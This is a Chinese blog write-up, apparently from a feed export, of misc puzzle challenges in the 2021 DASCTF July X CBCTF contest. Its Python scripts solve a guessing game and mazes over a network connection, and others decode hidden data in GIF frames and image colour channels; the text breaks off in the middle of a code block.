            "id": "https://www.sycamore.top/CyberSecurity/CTF/2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-misc%E9%83%A8%E5%88%86wp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-misc%E9%83%A8%E5%88%86wp/",
            "title": "2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th misc部分wp",
            "date_published": "2021-11-26T10:20:21.000Z",
            "content_html": "<div class=\"note warning\">\n<p>文章时间太早，图片丢失</p>\n</div>\n<h2 id=\"misc-red_vs_blue\"><a class=\"anchor\" href=\"#misc-red_vs_blue\">#</a> Misc-red_vs_blue</h2>\n<p>简单来说就是 66 轮试错，同一次 nc 里面的答案是一样的，要么输入 r, 要么输入 b，错了就输入 y 重来，因为有时间限制，只能上脚本（本来还想手搓）<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sh=process(&quot;./buu--rip&quot;)  local端</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>, <span class=\"number\">28699</span>)</span><br><span class=\"line\">s = []</span><br><span class=\"line\">i=<span class=\"number\">1</span></span><br><span class=\"line\">tag=<span class=\"number\">0</span></span><br><span class=\"line\">q = sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i==<span class=\"number\">66</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> tag==<span class=\"number\">0</span>:</span><br><span class=\"line\">        sh.send(<span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">        q=sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;again&#x27;</span>  <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> q:</span><br><span class=\"line\">            i+=<span class=\"number\">1</span>;s.append(<span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> :</span><br><span class=\"line\">             sh.send(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">             <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">                 sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">                 sh.send(m)</span><br><span class=\"line\">             sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)  <span class=\"comment\">#</span></span><br><span class=\"line\">             tag = <span class=\"number\">1</span></span><br><span class=\"line\">             <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> tag==<span class=\"number\">1</span>:</span><br><span class=\"line\">        sh.send(<span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\">        q=sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;again&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> q:</span><br><span class=\"line\">            i += <span class=\"number\">1</span>;s.append(<span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">              sh.send(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">              <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">                  sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">                  sh.send(m)</span><br><span class=\"line\">              sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">              tag = <span class=\"number\">0</span></span><br><span class=\"line\">              <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure><br />\n 代码稍微有点小问题，第 66 轮直接跳出来了，懒得改了。。。<br />\n就随便猜一下然后就可以拿到 flag。</p>\n<hr />\n<h2 id=\"misc-funny_maze\"><a class=\"anchor\" href=\"#misc-funny_maze\">#</a> Misc-funny_maze</h2>\n<p>跟前面那题<br />\n差不多的思路，就是典型的迷宫问题多搞几次就能出来 flag.</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mark</span>(<span class=\"params\">maze,pos</span>):  <span class=\"comment\">#给迷宫maze的位置pos标&quot;2&quot;表示“到过了”</span></span><br><span class=\"line\">    maze[pos[<span class=\"number\">0</span>]][pos[<span class=\"number\">1</span>]]=<span class=\"number\">2</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">passable</span>(<span class=\"params\">maze,pos</span>): <span class=\"comment\">#检查迷宫maze的位置pos是否可通行</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> maze[pos[<span class=\"number\">0</span>]][pos[<span class=\"number\">1</span>]]==<span class=\"number\">0</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_path</span>(<span class=\"params\">maze,pos,end</span>):</span><br><span class=\"line\">    mark(maze,pos)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> pos==end:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(pos,end=<span class=\"string\">&quot; &quot;</span>)  <span class=\"comment\">#已到达出口，输出这个位置。成功结束</span></span><br><span class=\"line\">        path.append(pos)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):      <span class=\"comment\">#否则按四个方向顺序检查</span></span><br><span class=\"line\">        nextp=pos[<span class=\"number\">0</span>]+dirs[i][<span class=\"number\">0</span>],pos[<span class=\"number\">1</span>]+dirs[i][<span class=\"number\">1</span>]</span><br><span class=\"line\">        <span class=\"comment\">#考虑下一个可能方向</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> passable(maze,nextp):        <span class=\"comment\">#不可行的相邻位置不管</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> find_path(maze,nextp,end):<span class=\"comment\">#如果从nextp可达出口，输出这个位置，成功结束</span></span><br><span class=\"line\">                <span class=\"built_in\">print</span>(pos,end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">                path.append(pos)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">see_path</span>(<span class=\"params\">maze,path,leng</span>):     <span class=\"comment\">#使寻找到的路径可视化</span></span><br><span class=\"line\">    length = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i,p <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(path):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i==<span class=\"number\">0</span>:</span><br><span class=\"line\">            maze[p[<span class=\"number\">0</span>]][p[<span class=\"number\">1</span>]] =<span class=\"string\">&quot;E&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> i==<span class=\"built_in\">len</span>(path)-<span class=\"number\">1</span>:</span><br><span class=\"line\">            maze[p[<span class=\"number\">0</span>]][p[<span class=\"number\">1</span>]]=<span class=\"string\">&quot;S&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            maze[p[<span class=\"number\">0</span>]][p[<span class=\"number\">1</span>]] =<span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> r <span class=\"keyword\">in</span> maze:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> r:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> c==<span class=\"number\">3</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;31m&#x27;</span>+<span class=\"string\">&quot;*&quot;</span>+<span class=\"string\">&quot; &quot;</span>+<span class=\"string\">&#x27;\\033[0m&#x27;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">                length+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> c==<span class=\"string\">&quot;S&quot;</span> <span class=\"keyword\">or</span> c==<span class=\"string\">&quot;E&quot;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;34m&#x27;</span>+c+<span class=\"string\">&quot; &quot;</span> + <span class=\"string\">&#x27;\\033[0m&#x27;</span>, end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> c==<span class=\"number\">2</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;32m&#x27;</span>+<span class=\"string\">&quot;#&quot;</span>+<span class=\"string\">&quot; &quot;</span>+<span class=\"string\">&#x27;\\033[0m&#x27;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> c==<span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;;40m&#x27;</span>+<span class=\"string\">&quot; &quot;</span>*<span class=\"number\">2</span>+<span class=\"string\">&#x27;\\033[0m&#x27;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot; &quot;</span>*<span class=\"number\">2</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(length+<span class=\"number\">1</span>)</span><br><span class=\"line\">    leng=length+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> leng</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">maze_change</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    MAZE=[]</span><br><span class=\"line\">    row=col=<span class=\"number\">0</span></span><br><span class=\"line\">    M=<span class=\"built_in\">str</span>(sh.recvuntil(<span class=\"string\">&quot;P&quot;</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(M)</span><br><span class=\"line\">    MAZE.append([])</span><br><span class=\"line\">    <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> M:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> col == num:</span><br><span class=\"line\">            MAZE.append([])</span><br><span class=\"line\">            row+=<span class=\"number\">1</span></span><br><span class=\"line\">            col=<span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> m == <span class=\"string\">&#x27;\\n&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m == <span class=\"string\">&#x27;#&#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">1</span>)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m == <span class=\"string\">&#x27; &#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">0</span>)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m == <span class=\"string\">&#x27;S&#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">0</span>)</span><br><span class=\"line\">            start=(row,col)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m ==<span class=\"string\">&#x27;E&#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">0</span>)</span><br><span class=\"line\">            end=(row,col)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m ==<span class=\"string\">&#x27;P&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(MAZE)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> MAZE, start, end</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gets</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    maze=[]</span><br><span class=\"line\">    start=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    end=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    maze,start,end=maze_change(num)</span><br><span class=\"line\">    find_path(maze,start,end)</span><br><span class=\"line\">    leng=<span class=\"number\">0</span></span><br><span class=\"line\">    leng=see_path(maze,path,leng)</span><br><span class=\"line\">    sh.sendline(<span class=\"built_in\">str</span>(leng+<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">sh=remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">27512</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;game&#x27;</span>))</span><br><span class=\"line\">sh.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">gets(<span class=\"number\">11</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;level!&#x27;</span>))</span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">gets(<span class=\"number\">21</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;level!&#x27;</span>))</span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">gets(<span class=\"number\">31</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;level!&#x27;</span>))</span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">gets(<span class=\"number\">101</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure><br />\n 其中迷宫问题的部分代码是从<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NjgxNzc3L2FydGljbGUvZGV0YWlscy84MzcxOTY4MA==\">这里</span>复制来的<br />\n值得注意的是多次循环，变量初始化的问题，我排查了好久 (￣_￣|||)<br />\n 一开始没有注意到这个问题，还以为是我哪个顺序出错了，后来才发现。</p>\n<hr />\n<h2 id=\"misc-ezsteganography\"><a class=\"anchor\" href=\"#misc-ezsteganography\">#</a> Misc-ezSteganography</h2>\n<p>比赛时只解出前半个，记录一下比赛时的错误思路\t(。﹏。)：<br />\n（<s>根据第二个提示，后半大概率是 Green 通道里的图片藏了啥信息，然而第一个提示里的 QIM quantization 估计是加密方法，然后，我们就纠在 QIM 是啥的问题上了。。。</s> ）</p>\n<p>然而实际上只要把 g0 和 g1 通道的两张图异或一下就可以了，就用 stegsolve 里的 Image Combiner 的功能</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/sycamore_cdn/wp-content/uploads/2021/09/post-187-613781a296735.png\" alt=\"前半flag加第一条提示\" /></p>\n<p>前半 flag 加第一条提示 ↑</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a30a77f.png\" alt=\"第二条提示\" /></p>\n<p>第二条提示 ↑</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a410b63.png\" alt=\"后半个flag\" /></p>\n<p>后半个 flag ↑</p>\n<hr />\n<h2 id=\"misc-just-a-gif\"><a class=\"anchor\" href=\"#misc-just-a-gif\">#</a> Misc-Just a GIF</h2>\n<p>『赛后复现』和国赛<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2NodS5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMTY4NTUyNDI=\"> running_pixel</span> 的题基本是一个思路，gif 分离出 451 张图，分为 41 组，每组 11 张图。<br />\n然后每组的第 i 张和第一组的第 i 张作比较，不一样的画黑，就可以了。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">path = <span class=\"string\">&quot;Just_a_GIF/&quot;</span>  <span class=\"comment\">#填自己的路径</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">11</span>):</span><br><span class=\"line\">    picn = Image.new(<span class=\"string\">&quot;RGB&quot;</span>,(<span class=\"number\">119</span>,<span class=\"number\">83</span>),(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">41</span>):</span><br><span class=\"line\">        p1=Image.<span class=\"built_in\">open</span>(path+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\">        p2=Image.<span class=\"built_in\">open</span>(path+<span class=\"built_in\">str</span>(i+j*<span class=\"number\">11</span>)+<span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">119</span>):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">83</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> p1.getpixel((w,h)) != p2.getpixel((w,h)):</span><br><span class=\"line\">                    picn.putpixel((w,h),(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\">    picn.save(<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br />\n 然后就拿到 11 张图片 ↓<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a48b444.png\" alt=\"请添加图片描述\" /></p>\n<p>手动拼接？\t↓<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a4d72e5.png\" alt=\"请添加图片描述\" /></p>\n<p>网上搜一下，貌似是 DataMatrix，扫出 flag</p>\n<blockquote 6bb73086aeb764b5727529d82b084cce=\"\">\n<p>DASCTF</p>\n</blockquote>\n<hr />\n<h2 id=\"misc-nuclear-wastewater\"><a class=\"anchor\" href=\"#misc-nuclear-wastewater\">#</a> Misc-Nuclear wastewater</h2>\n<p>『赛后复现』彩色的二维码，比赛最后经队友提示，看了看它 RGB 才有了思路。<br />\n所有的色块竟然都是，三个通道两个为 0，剩一个有值，那肯定密码就藏在这里了。<br />\n写个脚本把数字转出来<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\">img = Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;Nuclear wastewater.png&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">230</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">230</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">            rgb=<span class=\"built_in\">list</span>(img.getpixel((t,j)))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> rgb[i]&gt;<span class=\"number\">32</span> <span class=\"keyword\">and</span> rgb[i]&lt;<span class=\"number\">128</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(rgb[i]),end=<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 得到这个</p>\n<blockquote>\n<p>Ys&gt;UEJht#?ppeEFtstR#<sub>:hi</sub>tR:@s@YRteK#e@KsR&amp;E&amp;:eR:Eht/#iKtteYKhYKYhhhihhKtC2tt:HVEesY&amp;#@Rj!seRi:eitEtKsetKtEE:hh#h#eYKYihhYK(Kt@iSY$KY/@pRsEetsip:~h@eeEs!E&amp;&amp;::EsEEei#/iYe#/ieKKt//iKYhh</p>\n</blockquote>\n<p>发现很多重复的字符，想到使用词频分析看一下<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> Counter</span><br><span class=\"line\">f = <span 